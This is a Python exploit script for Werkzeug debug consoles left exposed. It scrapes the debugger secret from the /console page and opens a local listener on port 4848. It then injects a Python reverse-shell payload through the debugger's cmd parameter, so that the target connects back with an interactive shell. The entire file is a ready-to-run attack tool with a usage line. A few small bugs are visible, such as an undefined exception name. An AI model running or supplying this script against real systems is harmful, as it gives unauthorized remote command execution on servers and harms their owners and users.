import requests
import re
import sys
import threading
import socket

hlp = '''Usage: python[3] shell.py <HOST> <PORT>
'''

if sys.version_info < (3, 0):
    input = raw_input
    
if len(sys.argv) != 3:
    print(hlp)
    sys.exit(-1)
    
host = sys.argv[1]
port = sys.argv[2]
local = requests.get('https://api.ipify.org').text


def l():
    so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    so.bind(('0.0.0.0', 4848))
    so.listen(5)
    conn, addr = so.accept()
    print('Got shell from %s port %s to %s 4848' % (addr[0], addr[1], socket.gethostname()))
    while 1:
        data = ''
        while 1:
            pack = conn.recv(1024).decode()
            data += pack
            if not len(pack):
                break
        buff = input(data)
        conn.send(buff.encode())
        if buff.replace(' ', '') == 'exit':
            sys.exit(-1)
        

try:
    r = requests.get('http://%s:%s/console' % (host, port))
except Ex:
    print('Failed to connect to %s port %s' % (host, port))
    sys.exit(-1)
    
if not 'Werkzeug ' in r.text:
    print('Debug disabled: Not exploitable')
    sys.exit(-1)
    
sh = 'bash'
if sys.platform == 'win32':
    sh = 'sh'
    
shell = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",4848));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/%s","-i"])' % (local, sh)

secret = re.findall("[0-9a-zA-Z]{20}", r.text)

if len(secret) != 1:
    print("Can't fetch the secret: Not exploitable")
    sys.exit(-1)
    
print('Secret: %s' % str(secret[0]))
print('Listening on port 4848 for reverse shell ...')
listen = threading.Thread(target=l)
listen.start()

data = {
        '__debugger__' : 'yes',
        'cmd' : str(shell),
        'frm' : '0',
        's' : secret[0]
        }
        
pwnsh = requests.get("http://%s:%s/console" % (host, port), params = data, headers = r.headers)
